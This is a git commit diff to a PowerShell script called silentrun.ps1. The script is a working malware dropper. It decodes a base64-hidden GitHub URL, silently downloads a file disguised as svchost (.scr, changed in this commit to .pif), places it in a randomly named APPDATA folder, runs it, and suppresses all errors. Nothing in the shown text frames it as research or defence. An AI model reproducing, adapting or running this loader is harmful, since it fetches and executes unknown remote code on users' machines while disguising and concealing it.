be9ebd4f0456c8ba01e770e6a0d79a6cb70d22c0
Unhiin <133892941+hypnotixx0@users.noreply.github.com>
2026-05-10 21:43:48 -0700

    Update silentrun.ps1

--- silentrun.ps1
+++ silentrun.ps1
@@ -1,13 +1,12 @@
-# Silent SCR Runner
-$scrUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2h5cG5vdGl4eDAveGVub2xvcmQvcmF3L3JlZnMvaGVhZHMvbWFpbi9zdmNob3N0LnNjcg=="))
-$downloadPath = "$env:USERPROFILE\Downloads\svchost.scr"
+# Silent PIF Runner
+$pifUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2h5cG5vdGl4eDAveGVub2xvcmQvcmF3L3JlZnMvaGVhZHMvbWFpbi9zdmNob3N0LnBpZg=="))
+$downloadPath = "$env:USERPROFILE\Downloads\svchost.txt"
 $randomFolder = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
 $finalPath = "$env:APPDATA\$randomFolder"
 
 try {
-    Invoke-WebRequest -Uri $scrUrl -OutFile $downloadPath -UseBasicParsing
+    Invoke-WebRequest -Uri $pifUrl -OutFile $downloadPath -UseBasicParsing
     New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
-    Copy-Item -Path $downloadPath -Destination "$finalPath\svchost.scr" -Force
-    & "$finalPath\svchost.scr"
-    Remove-Item -Path $downloadPath -Force
+    Move-Item -Path $downloadPath -Destination "$finalPath\svchost.pif" -Force
+    & "$finalPath\svchost.pif"
 } catch {}
